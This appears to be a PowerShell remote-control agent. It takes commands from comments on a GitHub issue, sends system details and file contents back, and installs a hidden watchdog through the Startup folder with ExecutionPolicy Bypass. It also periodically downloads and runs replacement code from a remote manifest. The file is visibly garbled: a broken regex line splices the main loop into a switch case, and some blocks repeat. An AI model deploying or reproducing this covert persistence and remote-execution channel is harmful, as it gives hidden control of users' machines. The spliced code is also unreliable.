# REALLBLACK BRIDGE V2
$ErrorActionPreference = 'Continue'

$Version = '3.2.0'
$Repo = 'realblackboss/twitch-gpt-gemini-2026'
$Issue = 1
$Trusted = 'realblackboss'
$BaseDir = Join-Path $env:LOCALAPPDATA 'ReallBlackBridge'
$StateFile = Join-Path $BaseDir 'state-v2.json'
$LogFile = Join-Path $BaseDir 'bridge-v2.log'
$AgentFile = Join-Path $BaseDir 'agent-v2.ps1'
$HealthFile = Join-Path $BaseDir 'health-v2.json'
$WatchdogFile = Join-Path $BaseDir 'watchdog-v2.ps1'
$BackupFile = Join-Path $BaseDir 'agent-v2.lastgood.ps1'
$PendingFile = Join-Path $BaseDir 'update-pending.json'
$ManifestUrl = 'https://raw.githubusercontent.com/realblackboss/reallblack-public-entrypoint/main/bridge/manifest-v2.json'
$ApiBase = 'https://api.github.com'

$script:BridgeMutex = New-Object System.Threading.Mutex($false, 'Local\REALLBLACK_BRIDGE_V2')
if (-not $script:BridgeMutex.WaitOne(0)) { exit }

$Roots = @{
  desktop   = [Environment]::GetFolderPath('Desktop')
  documents = [Environment]::GetFolderPath('MyDocuments')
  downloads = Join-Path $env:USERPROFILE 'Downloads'
  bridge    = $BaseDir
}

function Ensure-Watchdog {
  try {
    $watchdogCode = @'
$ErrorActionPreference = 'SilentlyContinue'
$BaseDir = Join-Path $env:LOCALAPPDATA 'ReallBlackBridge'
$AgentFile = Join-Path $BaseDir 'agent-v2.ps1'
$BackupFile = Join-Path $BaseDir 'agent-v2.lastgood.ps1'
$HealthFile = Join-Path $BaseDir 'health-v2.json'
$PendingFile = Join-Path $BaseDir 'update-pending.json'
$mutex = New-Object System.Threading.Mutex($false, 'Local\REALLBLACK_BRIDGE_WATCHDOG_V2')
if (-not $mutex.WaitOne(0)) { exit }

function Test-ScriptSyntax([string]$Path) {
  if (-not (Test-Path $Path -PathType Leaf)) { return $false }
  try {
    $tokens = $null
    $errors = $null
    [System.Management.Automation.Language.Parser]::ParseFile($Path, [ref]$tokens, [ref]$errors) | Out-Null
    return (@($errors).Count -eq 0)
  } catch {
    return $false
  }
}

function Restore-LastGood {
  if (Test-ScriptSyntax $BackupFile) {
    Copy-Item -LiteralPath $BackupFile -Destination $AgentFile -Force
    Remove-Item $PendingFile -Force -ErrorAction SilentlyContinue
    return $true
  }
  return $false
}

while ($true) {
  $restart = $false
  $rollback = $false
  $procs = @(Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" |
    Where-Object { $_.CommandLine -like '*ReallBlackBridge*agent-v2.ps1*' })

  $healthExists = Test-Path $HealthFile
  $healthAge = 999999
  if ($healthExists) {
    try { $healthAge = ((Get-Date) - (Get-Item $HealthFile).LastWriteTime).TotalSeconds } catch {}
  }

  if ($procs.Count -eq 0) {
    $restart = $true
    if (-not (Test-ScriptSyntax $AgentFile)) {
      $rollback = $true
    } elseif ((Test-Path $PendingFile) -and $healthAge -gt 30) {
      $rollback = $true
    }
  } elseif (-not $healthExists) {
    $oldEnough = $false
    foreach ($p in $procs) {
      try {
        $created = [Management.ManagementDateTimeConverter]::ToDateTime([string]$p.CreationDate)
        if (((Get-Date) - $created).TotalSeconds -gt 60) { $oldEnough = $true }
      } catch {}
    }
    if ($oldEnough) {
      foreach ($p in $procs) { try { Stop-Process -Id $p.ProcessId -Force } catch {} }
      $restart = $true
      if (Test-Path $PendingFile) { $rollback = $true }
    }
  } elseif ($healthAge -gt 60) {
    foreach ($p in $procs) { try { Stop-Process -Id $p.ProcessId -Force } catch {} }
    $restart = $true
    if (Test-Path $PendingFile) { $rollback = $true }
  }

  if ($rollback) { Restore-LastGood | Out-Null }

  if ($restart -and (Test-ScriptSyntax $AgentFile)) {
    Start-Process powershell.exe -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$AgentFile) -WindowStyle Hidden
  }

  Start-Sleep -Seconds 10
}
'@

    Set-Content -Path $WatchdogFile -Value $watchdogCode -Encoding UTF8
    $startup = [Environment]::GetFolderPath('Startup')
    $launch = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $WatchdogFile + '"'
    Set-Content -Path (Join-Path $startup 'REALLBLACK-BRIDGE-WATCHDOG.cmd') -Value ('@echo off' + [Environment]::NewLine + $launch) -Encoding ASCII

    $existing = @(Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" |
      Where-Object { $_.CommandLine -like '*ReallBlackBridge*watchdog-v2.ps1*' })
    foreach ($p in $existing) { try { Stop-Process -Id $p.ProcessId -Force } catch {} }
    Start-Sleep -Milliseconds 250
    Start-Process powershell.exe -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$WatchdogFile) -WindowStyle Hidden
  } catch {
    Write-Log ('Watchdog setup falhou: ' + $_.Exception.Message)
  }
}

function Write-Health([int]$PollDelayMs) {
  try {
    @{
      version = $Version
      pid = $PID
      pollDelayMs = $PollDelayMs
      machine = $env:COMPUTERNAME
      timestamp = (Get-Date).ToString('o')
    } | ConvertTo-Json -Compress | Set-Content -Path $HealthFile -Encoding UTF8
  } catch {}
}

function Write-Log([string]$Message) {
  try {
    New-Item -ItemType Directory -Force -Path $BaseDir | Out-Null
    Add-Content -Path $LogFile -Value ("[{0}] {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'), $Message)
    if ((Get-Item $LogFile -ErrorAction SilentlyContinue).Length -gt 1048576) {
      Move-Item $LogFile ($LogFile + '.1') -Force -ErrorAction SilentlyContinue
    }
  } catch {}
}

function Initialize-GitHubApi {
  $token = (& gh auth token -h github.com 2>$null | Select-Object -First 1)
  if ([string]::IsNullOrWhiteSpace([string]$token)) { throw 'github_token_unavailable' }
  $script:GitHubHeaders = @{
    Authorization = ('Bearer ' + ([string]$token).Trim())
    Accept = 'application/vnd.github+json'
    'X-GitHub-Api-Version' = '2022-11-28'
    'User-Agent' = 'REALLBLACK-Bridge-V2'
  }
  $script:CommentsEtag = $null
}

function Poll-Comments([datetime]$Since) {
  try {
    $uri = "$ApiBase/repos/$Repo/issues/$Issue/comments?per_page=100"
    $comments = Invoke-RestMethod -UseBasicParsing -Method Get -Uri $uri -Headers $script:GitHubHeaders -TimeoutSec 15
    return @($comments)
  } catch {
    $status = 0
    try { $status = [int]$_.Exception.Response.StatusCode } catch {}
    if ($status -eq 403 -or $status -eq 429) { throw 'github_rate_limited' }
    throw
  }
}

function Post-Comment([string]$Body) {
  try {
    $payload = @{ body = $Body } | ConvertTo-Json -Compress
    Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$ApiBase/repos/$Repo/issues/$Issue/comments" -Headers $script:GitHubHeaders -ContentType 'application/json' -Body $payload -TimeoutSec 15 | Out-Null
    return $true
  } catch {
    Write-Log ('Post falhou: ' + $_.Exception.Message)
    return $false
  }
}

function Encode-Json($Object) {
  $json = $Object | ConvertTo-Json -Compress -Depth 8
  return [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json))
}

function Decode-Json([string]$Base64) {
  $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Base64))
  return ($json | ConvertFrom-Json)
}

function Reply([string]$Id, [bool]$Ok, $Data, [string]$ErrorText = '') {
  $payload = [ordered]@{
    id = $Id
    ok = $Ok
    version = $Version
    machine = $env:COMPUTERNAME
    timestamp = (Get-Date).ToString('o')
    data = $Data
    error = $ErrorText
  }
  Post-Comment ("RB2_RESULT $Id" + [Environment]::NewLine + (Encode-Json $payload)) | Out-Null
}

function Resolve-SafePath([string]$RootName, [string]$RelativePath) {
  if (-not $Roots.ContainsKey($RootName)) { throw 'root_not_allowed' }
  if ([IO.Path]::IsPathRooted($RelativePath)) { throw 'absolute_path_not_allowed' }

  $root = [IO.Path]::GetFullPath([string]$Roots[$RootName]).TrimEnd('\')
  $full = [IO.Path]::GetFullPath((Join-Path $root $RelativePath))
  if ($full -ne $root -and -not $full.StartsWith($root + '\', [StringComparison]::OrdinalIgnoreCase)) {
    throw 'path_escape_blocked'
  }
  return $full
}

function Get-State {
  if (Test-Path $StateFile) {
    try { return (Get-Content $StateFile -Raw | ConvertFrom-Json) } catch {}
  }
  return [pscustomobject]@{ lastCommentId = 0 }
}

function Save-State([long]$LastCommentId) {
  @{ lastCommentId = $LastCommentId } | ConvertTo-Json -Compress | Set-Content $StateFile -Encoding UTF8
}

function Get-MaxCommentId {
  try {
    $raw = & gh api --paginate "repos/$Repo/issues/$Issue/comments?per_page=100" --slurp
    if ($LASTEXITCODE -ne 0) { return 0 }
    $pages = $raw | ConvertFrom-Json
    $max = 0L
    foreach ($page in @($pages)) {
      foreach ($c in @($page)) {
        if ([long]$c.id -gt $max) { $max = [long]$c.id }
      }
    }
    return $max
  } catch { return 0 }
}

function Get-SystemInfo {
  $os = Get-CimInstance Win32_OperatingSystem
  $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
  $disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" | ForEach-Object {
    [ordered]@{
      drive = $_.DeviceID
      sizeGB = [Math]::Round($_.Size / 1GB, 1)
      freeGB = [Math]::Round($_.FreeSpace / 1GB, 1)
    }
  }
  return [ordered]@{
    computer = $env:COMPUTERNAME
    user = $env:USERNAME
    os = $os.Caption
    cpu = $cpu.Name
    memoryGB = [Math]::Round($os.TotalVisibleMemorySize / 1MB, 1)
    freeMemoryGB = [Math]::Round($os.FreePhysicalMemory / 1MB, 1)
    disks = @($disks)
  }
}

function Invoke-AllowedOperation([string]$Op, $CmdArgs) {
  switch ($Op.ToUpperInvariant()) {
    'PING' {
      return @{ pong = $true }
    }

    'BRIDGE_INFO' {
      return @{ version = $Version; pid = $PID; roots = @($Roots.Keys); activePollMs = 1000; idlePollMs = 4000; transport = 'github-rest-etag'; uptimeSec = [int]((Get-Date) - $script:StartTime).TotalSeconds }
    }

    'SYSINFO' {
      return Get-SystemInfo
    }

    'SELF_UPDATE' {
      Check-SelfUpdate
      return @{ checked = $true; version = $Version }
    }

    'RESTART_AGENT' {
      try { $script:BridgeMutex.ReleaseMutex() } catch {}
      Start-Process powershell.exe -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$AgentFile) -WindowStyle Hidden
      Start-Sleep -Milliseconds 250
      exit
    }

    'MKDIR' {
      $p = Resolve-SafePath ([string]$CmdArgs.root) ([string]$CmdArgs.path)
      New-Item -ItemType Directory -Force -Path $p | Out-Null
      return @{ path = $p; created = $true }
    }

    'EXISTS' {
      $p = Resolve-SafePath ([string]$CmdArgs.root) ([string]$CmdArgs.path)
      return @{ path = $p; exists = (Test-Path $p) }
    }

    'LIST' {
      $p = Resolve-SafePath ([string]$CmdArgs.root) ([string]$CmdArgs.path)
      if (-not (Test-Path $p -PathType Container)) { throw 'directory_not_found' }
      $items = Get-ChildItem -LiteralPath $p -Force | Select-Object -First 500 | ForEach-Object {
        [ordered]@{
          name = $_.Name
          type = if ($_.PSIsContainer) { 'dir' } else { 'file' }
          length = if ($_.PSIsContainer) { $null } else { $_.Length }
          modified = $_.LastWriteTime.ToString('o')
        }
      }
      return @{ path = $p; items = @($items) }
    }

    'READ_TEXT' {
      $p = Resolve-SafePath ([string]$CmdArgs.root) ([string]$CmdArgs.path)
      if (-not (Test-Path $p -PathType Leaf)) { throw 'file_not_found' }
      $item = Get-Item -LiteralPath $p
      if ($item.Length -gt 262144) { throw 'file_too_large' }
      return @{ path = $p; text = (Get-Content -LiteralPath $p -Raw -ErrorAction Stop) }
    }

    'WRITE_TEXT' {
      $p = Resolve-SafePath ([string]$CmdArgs.root) ([string]$CmdArgs.path)
      $text = [string]$CmdArgs.text
      if ([Text.Encoding]::UTF8.GetByteCount($text) -gt 1048576) { throw 'content_too_large' }
      $parent = Split-Path -Parent $p
      New-Item -ItemType Directory -Force -Path $parent | Out-Null
      Set-Content -LiteralPath $p -Value $text -Encoding UTF8
      return @{ path = $p; bytes = [Text.Encoding]::UTF8.GetByteCount($text) }
    }

    'APPEND_TEXT' {
      $p = Resolve-SafePath ([string]$CmdArgs.root) ([string]$CmdArgs.path)
      $text = [string]$CmdArgs.text
      if ([Text.Encoding]::UTF8.GetByteCount($text) -gt 262144) { throw 'content_too_large' }
      $parent = Split-Path -Parent $p
      New-Item -ItemType Directory -Force -Path $parent | Out-Null
      Add-Content -LiteralPath $p -Value $text -Encoding UTF8
      return @{ path = $p; appended = $true }
    }

    'MOVE' {
      $src = Resolve-SafePath ([string]$CmdArgs.root) ([string]$CmdArgs.source)
      $dst = Resolve-SafePath ([string]$CmdArgs.root) ([string]$CmdArgs.destination)
      if (-not (Test-Path $src)) { throw 'source_not_found' }
      $parent = Split-Path -Parent $dst
      New-Item -ItemType Directory -Force -Path $parent | Out-Null
      Move-Item -LiteralPath $src -Destination $dst -Force
      return @{ source = $src; destination = $dst }
    }

    'COPY' {
      $src = Resolve-SafePath ([string]$CmdArgs.root) ([string]$CmdArgs.source)
      $dst = Resolve-SafePath ([string]$CmdArgs.root) ([string]$CmdArgs.destination)
      if (-not (Test-Path $src)) { throw 'source_not_found' }
      $parent = Split-Path -Parent $dst
      New-Item -ItemType Directory -Force -Path $parent | Out-Null
      Copy-Item -LiteralPath $src -Destination $dst -Recurse -Force
      return @{ source = $src; destination = $dst }
    }

    'PROC_LIST' {
      $items = Get-Process | Sort-Object CPU -Descending | Select-Object -First 200 | ForEach-Object {
        [ordered]@{
          pid = $_.Id
          name = $_.ProcessName
          cpu = if ($null -eq $_.CPU) { 0 } else { [Math]::Round($_.CPU, 1) }
          memoryMB = [Math]::Round($_.WorkingSet64 / 1MB, 1)
        }
      }
      return @{ processes = @($items) }
    }

    'PROC_STOP' {
      $target = Get-Process -Id ([int]$CmdArgs.pid) -ErrorAction Stop
      $protected = @('System','Idle','Registry','Memory Compression','smss','csrss','wininit','winlogon','services','lsass','svchost','dwm')
      if ($target.Id -eq $PID -or $protected -contains $target.ProcessName) { throw 'protected_process' }
      Stop-Process -Id $target.Id -Force -ErrorAction Stop
      return @{ pid = $target.Id; name = $target.ProcessName; stopped = $true }
    }

    'KBD_DEEP_AUDIT' {
      $devices = @()
      try {
        $devices = @(Get-CimInstance Win32_Keyboard | ForEach-Object {
          [ordered]@{
            name = $_.Name
            description = $_.Description
            deviceId = $_.DeviceID
            pnpDeviceId = $_.PNPDeviceID
            status = $_.Status
            layout = $_.Layout
            availability = $_.Availability
          }
        })
      } catch {}

      $pnp = @()
      try {
        $pnp = @(Get-PnpDevice -Class Keyboard -ErrorAction SilentlyContinue | ForEach-Object {
          [ordered]@{
            friendlyName = $_.FriendlyName
            instanceId = $_.InstanceId
            status = [string]$_.Status
            problem = [string]$_.Problem
          }
        })
      } catch {}

      $preload = @{}
      try {
        $x = Get-ItemProperty 'HKCU:\Keyboard Layout\Preload'
        foreach ($p in $x.PSObject.Properties) {
          if ($p.Name -notlike 'PS*') { $preload[$p.Name] = [string]$p.Value }
        }
      } catch {}

      $subs = @{}
      try {
        $x = Get-ItemProperty 'HKCU:\Keyboard Layout\Substitutes'
        foreach ($p in $x.PSObject.Properties) {
          if ($p.Name -notlike 'PS*') { $subs[$p.Name] = [string]$p.Value }
        }
      } catch {}

      $classFilters = [ordered]@{}
      try {
        $k = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}'
        $classFilters.upperFilters = @($k.UpperFilters)
        $classFilters.lowerFilters = @($k.LowerFilters)
      } catch {}

      $layoutInfo = [ordered]@{}
      try {
        $k = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layouts\00010416'
        $layoutInfo.layoutText = [string]$k.'Layout Text'
        $layoutInfo.layoutFile = [string]$k.'Layout File'
        $layoutInfo.layoutId = [string]$k.'Layout Id'
      } catch {}

      $accessibility = [ordered]@{}
      foreach ($name in @('StickyKeys','Keyboard Response','ToggleKeys')) {
        try {
          $v = Get-ItemProperty ("HKCU:\Control Panel\Accessibility\" + $name)
          $o = @{}
          foreach ($p in $v.PSObject.Properties) {
            if ($p.Name -notlike 'PS*') { $o[$p.Name] = [string]$p.Value }
          }
          $accessibility[$name] = $o
        } catch {}
      }

      $remapProcesses = @()
      try {
        $patterns = @('AutoHotkey','PowerToys','KeyboardManager','SharpKeys','KeyTweak','Logi','LGHUB','Razer','Synapse','iCUE','Corsair','SteelSeries','DS4Windows','reWASD')
        $remapProcesses = @(Get-Process -ErrorAction SilentlyContinue | Where-Object {
          $n = $_.ProcessName
          $hit = $false
          foreach ($pat in $patterns) { if ($n -like ('*' + $pat + '*')) { $hit = $true; break } }
          $hit
        } | ForEach-Object {
          [ordered]@{ name=$_.ProcessName; pid=$_.Id }
        })
      } catch {}

      $installed = @()
      try {
        $keys = @(
          'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
          'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
          'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
        )
        $installed = @(Get-ItemProperty $keys -ErrorAction SilentlyContinue | Where-Object {
          $n = [string]$_.DisplayName
          $n -match '(?i)PowerToys|AutoHotkey|SharpKeys|KeyTweak|Logitech|G HUB|Razer|Synapse|Corsair|iCUE|SteelSeries|reWASD'
        } | Select-Object -ExpandProperty DisplayName -Unique)
      } catch {}

      $osk = [ordered]@{}
      try {
        $osk.layout = [string](Get-Culture).Name
        $osk.ui = [string](Get-UICulture).Name
      } catch {}

      return @{
        devices = @($devices)
        pnp = @($pnp)
        preload = $preload
        substitutes = $subs
        classFilters = $classFilters
        layoutInfo = $layoutInfo
        accessibility = $accessibility
        remapProcesses = @($remapProcesses)
        installedRemappers = @($installed)
        culture = $osk
      }
    }

    'FIX_ABNT2_SC073' {
      $startup = [Environment]::GetFolderPath('Startup')
      $scriptPath = Join-Path $startup 'CORRIGIR_INTERROGACAO.ahk'

      $ahk = @'
#Requires AutoHotkey v2.0
#SingleInstance Force

SC073::SendText "/"
+SC073::SendText "?"
'@

      Set-Content -LiteralPath $scriptPath -Value $ahk -Encoding UTF8

      try {
        $l = New-WinUserLanguageList 'pt-BR'
        $l[0].InputMethodTips.Clear()
        $l[0].InputMethodTips.Add('0416:00010416')
        Set-WinUserLanguageList $l -Force
        Set-WinDefaultInputMethodOverride -InputTip '0416:00010416'
        New-Item -Path 'HKCU:\Keyboard Layout\Preload' -Force | Out-Null
        Set-ItemProperty -Path 'HKCU:\Keyboard Layout\Preload' -Name '1' -Value '00010416' -Force
      } catch {}

      Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
        Where-Object {
          $_.Name -match '^AutoHotkey(64|UX)?\.exe
      $langs = @(Get-WinUserLanguageList | ForEach-Object {
        [ordered]@{
          languageTag = $_.LanguageTag
          inputTips = @($_.InputMethodTips)
        }
      })
      $override = ''
      try { $override = [string](Get-WinDefaultInputMethodOverride).InputTip } catch {}
      $scanMapPresent = $false
      try {
        $v = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -ErrorAction Stop
        $scanMapPresent = ($null -ne $v.'Scancode Map')
      } catch {}
      return @{ languages=@($langs); override=$override; scancodeMapPresent=$scanMapPresent }
    }

    'FIX_QUESTION_KEY' {
      $r = [ordered]@{
        languageFixed = $false
        overrideFixed = $false
        preloadFixed = $false
        scancodeMapPresent = $false
        scancodeMapRemoved = $false
        elevationRequested = $false
        ctfmonRestarted = $false
      }

      $l = New-WinUserLanguageList 'pt-BR'
      $l[0].InputMethodTips.Clear()
      $l[0].InputMethodTips.Add('0416:00010416')
      Set-WinUserLanguageList $l -Force
      $r.languageFixed = $true

      Set-WinDefaultInputMethodOverride -InputTip '0416:00010416'
      $r.overrideFixed = $true

      New-Item -Path 'HKCU:\Keyboard Layout\Preload' -Force | Out-Null
      Set-ItemProperty -Path 'HKCU:\Keyboard Layout\Preload' -Name '1' -Value '00010416' -Force
      $r.preloadFixed = $true

      try {
        $v = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -ErrorAction Stop
        if ($null -ne $v.'Scancode Map') {
          $r.scancodeMapPresent = $true
          try {
            Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -Force -ErrorAction Stop
            $r.scancodeMapRemoved = $true
          } catch {
            $adminFix = Join-Path $BaseDir 'fix-question-key-admin.ps1'
            @"
Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -Force -ErrorAction SilentlyContinue
Stop-Process -Name ctfmon -Force -ErrorAction SilentlyContinue
Start-Process "$env:WINDIR\System32\ctfmon.exe"
"@ | Set-Content -Path $adminFix -Encoding UTF8
            try {
              Start-Process powershell.exe -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$adminFix)
              $r.elevationRequested = $true
            } catch {}
          }
        }
      } catch {}

      Stop-Process -Name ctfmon -Force -ErrorAction SilentlyContinue
      Start-Process "$env:WINDIR\System32\ctfmon.exe"
      $r.ctfmonRestarted = $true

      return $r
    }

    default {
      throw 'operation_not_allowed'
    }
  }
}

function Test-PowerShellSyntax([string]$Path) {
  if (-not (Test-Path $Path -PathType Leaf)) { return $false }
  try {
    $tokens = $null
    $errors = $null
    [System.Management.Automation.Language.Parser]::ParseFile($Path, [ref]$tokens, [ref]$errors) | Out-Null
    return (@($errors).Count -eq 0)
  } catch {
    return $false
  }
}

function Check-SelfUpdate {
  try {
    $stamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    $manifest = Invoke-RestMethod -UseBasicParsing -Uri ($ManifestUrl + '?t=' + $stamp) -TimeoutSec 15
    if ([string]::IsNullOrWhiteSpace([string]$manifest.url) -or [string]::IsNullOrWhiteSpace([string]$manifest.sha256)) {
      throw 'invalid_update_manifest'
    }

    $expectedHash = ([string]$manifest.sha256).ToLowerInvariant()
    $currentHash = ''
    if (Test-Path $AgentFile -PathType Leaf) {
      try { $currentHash = (Get-FileHash $AgentFile -Algorithm SHA256).Hash.ToLowerInvariant() } catch {}
    }
    if ($currentHash -eq $expectedHash) { return }

    $tmp = Join-Path $BaseDir 'agent-v2.candidate.ps1'
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    Invoke-WebRequest -UseBasicParsing -Uri ([string]$manifest.url + '?t=' + $stamp) -OutFile $tmp -TimeoutSec 20

    $newHash = (Get-FileHash $tmp -Algorithm SHA256).Hash.ToLowerInvariant()
    if ($newHash -ne $expectedHash) {
      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
      throw 'update_hash_mismatch'
    }
    if (-not (Test-PowerShellSyntax $tmp)) {
      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
      throw 'update_syntax_invalid'
    }

    @{
      targetVersion = [string]$manifest.version
      targetHash = $expectedHash
      started = (Get-Date).ToString('o')
    } | ConvertTo-Json -Compress | Set-Content -Path $PendingFile -Encoding UTF8

    if (Test-Path $AgentFile -PathType Leaf) {
      if (Test-PowerShellSyntax $AgentFile) {
        [IO.File]::Replace($tmp, $AgentFile, $BackupFile, $true)
      } else {
        Move-Item $tmp $AgentFile -Force
      }
    } else {
      Move-Item $tmp $AgentFile -Force
    }

    Write-Log ('Self-update preparado e validado: ' + [string]$manifest.version + ' hash=' + $expectedHash)
    try { $script:BridgeMutex.ReleaseMutex() } catch {}
    Start-Process powershell.exe -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$AgentFile) -WindowStyle Hidden
    Start-Sleep -Milliseconds 300
    exit
  } catch {
    Write-Log ('Self-update falhou: ' + $_.Exception.Message)
  }
}

New-Item -ItemType Directory -Force -Path $BaseDir | Out-Null
Initialize-GitHubApi
Ensure-Watchdog

$state = Get-State
$lastId = [long]$state.lastCommentId
if ($lastId -eq 0) {
  $lastId = Get-MaxCommentId
  Save-State $lastId
}

Write-Log ("Agente V2 iniciado PID=$PID last=$lastId")
Post-Comment ("RB2_STATUS" + [Environment]::NewLine + (Encode-Json @{
  status='online'; version=$Version; pid=$PID; machine=$env:COMPUTERNAME; timestamp=(Get-Date).ToString('o')
})) | Out-Null
Write-Health 1000
Remove-Item $PendingFile -Force -ErrorAction SilentlyContinue

$lastUpdateCheck = Get-Date
$pollSince = (Get-Date).ToUniversalTime().AddSeconds(-10)
$pollDelayMs = 2000
$activeUntil = (Get-Date).AddSeconds(10)
$lastHealthWrite = (Get-Date).AddMinutes(-1)

while ($true) {
  try {
    $comments = @(Poll-Comments $pollSince)
    if ($comments.Count -gt 0) {
      foreach ($c in @($comments | Sort-Object id)) {
        $cid = [long]$c.id
        if ($cid -le $lastId) { continue }

        $lastId = $cid
        Save-State $lastId

        if ($c.user.login -ne $Trusted) { continue }
        $body = [string]$c.body
        if (-not $body.StartsWith('RB2_CMD ')) { continue }

        $lines = $body -split "\r?\n"
        $header = $lines[0].Split(' ', [StringSplitOptions]::RemoveEmptyEntries)
        if ($header.Count -lt 3) { continue }

        $cmdId = [string]$header[1]
        $op = [string]$header[2]
        if ($cmdId -notmatch '^[A-Za-z0-9._-]{1,64}$') { continue }
        try {
          $created = [DateTimeOffset]::Parse([string]$c.created_at)
          if (([DateTimeOffset]::UtcNow - $created.ToUniversalTime()).TotalMinutes -gt 10) { continue }
        } catch {}
        $activeUntil = (Get-Date).AddSeconds(30)
        $cmdArgs = [pscustomobject]@{}
        if ($lines.Count -ge 2 -and -not [string]::IsNullOrWhiteSpace($lines[1])) {
          try { $cmdArgs = Decode-Json $lines[1].Trim() } catch {
            Reply $cmdId $false $null 'invalid_payload'
            continue
          }
        }

        try {
          $result = Invoke-AllowedOperation $op $cmdArgs
          Reply $cmdId $true $result ''
        } catch {
          Reply $cmdId $false $null $_.Exception.Message
        }
      }

      $latestCreated = $null
      foreach ($item in @($comments)) {
        try {
          $dt = [DateTimeOffset]::Parse([string]$item.created_at).UtcDateTime
          if ($null -eq $latestCreated -or $dt -gt $latestCreated) { $latestCreated = $dt }
        } catch {}
      }
      if ($null -ne $latestCreated -and $latestCreated -gt $pollSince.AddSeconds(2)) {
        $pollSince = $latestCreated.AddSeconds(-2)
        $script:CommentsEtag = $null
      }
    }

    if ((Get-Date) -lt $activeUntil) { $pollDelayMs = 1000 } else { $pollDelayMs = 2000 }
  } catch {
    Write-Log ('Loop error: ' + $_.Exception.Message)
    if ($_.Exception.Message -eq 'github_rate_limited') {
      $pollDelayMs = 60000
    } else {
      $pollDelayMs = [Math]::Min([Math]::Max($pollDelayMs * 2, 3000), 30000)
    }
  }

  if (((Get-Date) - $lastHealthWrite).TotalSeconds -ge 10) {
    Write-Health $pollDelayMs
    $lastHealthWrite = Get-Date
  }

  if (((Get-Date) - $lastUpdateCheck).TotalMinutes -ge 2) {
    Check-SelfUpdate
    $lastUpdateCheck = Get-Date
  }

  Start-Sleep -Milliseconds $pollDelayMs
}
 -and
          $_.CommandLine -like '*CORRIGIR_INTERROGACAO.ahk*'
        } |
        ForEach-Object {
          try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
        }

      $exe = $null
      $candidates = @(
        'C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe',
        'C:\Program Files (x86)\AutoHotkey\v2\AutoHotkey64.exe'
      )
      foreach ($candidate in $candidates) {
        if (Test-Path $candidate -PathType Leaf) { $exe = $candidate; break }
      }

      if ($null -eq $exe) {
        $roots = @(
          (Join-Path ([Environment]::GetFolderPath('ProgramFiles')) 'AutoHotkey'),
          (Join-Path ([Environment]::GetFolderPath('ProgramFilesX86')) 'AutoHotkey')
        )
        foreach ($root in $roots) {
          if ([string]::IsNullOrWhiteSpace([string]$root) -or -not (Test-Path $root)) { continue }
          $found = Get-ChildItem -LiteralPath $root -Filter 'AutoHotkey64.exe' -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 1
          if ($null -ne $found) { $exe = $found.FullName; break }
        }
      }

      if ($null -eq $exe) { throw 'autohotkey_v2_not_found' }

      Start-Process -FilePath $exe -ArgumentList @($scriptPath) | Out-Null
      Start-Sleep -Milliseconds 800

      Stop-Process -Name ctfmon -Force -ErrorAction SilentlyContinue
      Start-Process "$env:WINDIR\System32\ctfmon.exe" | Out-Null

      $running = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
        Where-Object {
          $_.Name -match '^AutoHotkey(64|UX)?\.exe
      $langs = @(Get-WinUserLanguageList | ForEach-Object {
        [ordered]@{
          languageTag = $_.LanguageTag
          inputTips = @($_.InputMethodTips)
        }
      })
      $override = ''
      try { $override = [string](Get-WinDefaultInputMethodOverride).InputTip } catch {}
      $scanMapPresent = $false
      try {
        $v = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -ErrorAction Stop
        $scanMapPresent = ($null -ne $v.'Scancode Map')
      } catch {}
      return @{ languages=@($langs); override=$override; scancodeMapPresent=$scanMapPresent }
    }

    'FIX_QUESTION_KEY' {
      $r = [ordered]@{
        languageFixed = $false
        overrideFixed = $false
        preloadFixed = $false
        scancodeMapPresent = $false
        scancodeMapRemoved = $false
        elevationRequested = $false
        ctfmonRestarted = $false
      }

      $l = New-WinUserLanguageList 'pt-BR'
      $l[0].InputMethodTips.Clear()
      $l[0].InputMethodTips.Add('0416:00010416')
      Set-WinUserLanguageList $l -Force
      $r.languageFixed = $true

      Set-WinDefaultInputMethodOverride -InputTip '0416:00010416'
      $r.overrideFixed = $true

      New-Item -Path 'HKCU:\Keyboard Layout\Preload' -Force | Out-Null
